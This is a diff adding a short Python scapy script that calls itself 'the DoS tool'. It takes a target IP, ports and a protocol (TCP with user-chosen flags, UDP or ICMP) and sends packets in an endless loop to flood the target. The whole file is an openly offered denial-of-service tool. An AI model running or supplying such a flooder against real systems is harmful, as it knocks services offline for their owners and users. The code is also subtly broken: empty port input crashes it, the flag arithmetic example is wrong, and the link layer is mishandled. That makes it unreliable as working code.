@@ -1,0 +1,61 @@
+from scapy.all import *
+import re
+ip_regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
+flags=0
+
+#Check ip address
+def check_ip(ip_user):
+    global ip_regex
+    if(re.search(ip_regex,ip_user)): 
+        #print("Valid IP address") 
+        return 0
+    else: 
+        print("Invalid IP address") 
+        return 1
+
+#Flags TCP
+def flags_tcp():
+     print("{:4} {:4} {:4} {:4} {:4} {:4}".format("URG", "ACK", "PSH", "RST", "SYN", "FIN"))
+     print("{:4} {:4} {:4} {:4} {:4} {:4}".format('32', '16', '8', '4', '2', '1'))
+     print("Enter flags, example: ACK and PSH : 48 (32+18) ")
+     print(" "*22+ "SYN and ACK : 18 (16+2) ")
+     global flags
+     while flags<=0 or flags>63 :
+         flags = int(input("Enter flags: "))
+     return flags
+    
+print("Welcome to the DoS tool\n\n")
+
+
+#soure and destination port
+print("Enter your source port. Or you can press enter to use random source port")
+sport = int(input("Source port:"))
+
+print("\nEnter your source port. Or you can press enter to use random source port")
+dport = int(input("Destination port:"))
+
+target_ip = input("Your target ip is:")
+
+while(check_ip(target_ip)):
+    target_ip = input("Your target ip is:")
+    
+print("\nProtocol: 1.tcp, 2.udp or 3.icmp")
+proto = input("Enter the protocol: ")
+while(proto != '1' and proto != '2' and proto != '3'):
+    proto = input("Enter the protocol: ")
+    
+if(proto == '1'): flags_tcp()
+
+if sport == '': sport = RandShort()
+if dport == '': dport = RandShort()
+ether = Ether()
+tcp_packet = TCP(flags = flags, sport = sport, dport = dport)
+if proto == '1':
+    packet=ether/IP(dst=target_ip, proto='tcp')/tcp_packet
+    send(packet,loop=1)
+elif proto == '2':
+    packet = ether/IP(dst=target_ip, proto ='udp')/UDP()
+    send(packet, loop=1)
+else:
+    packet = ether/IP(dst=target_ip,proto='icmp')/ICMP()
+    send(packet, loop=1)
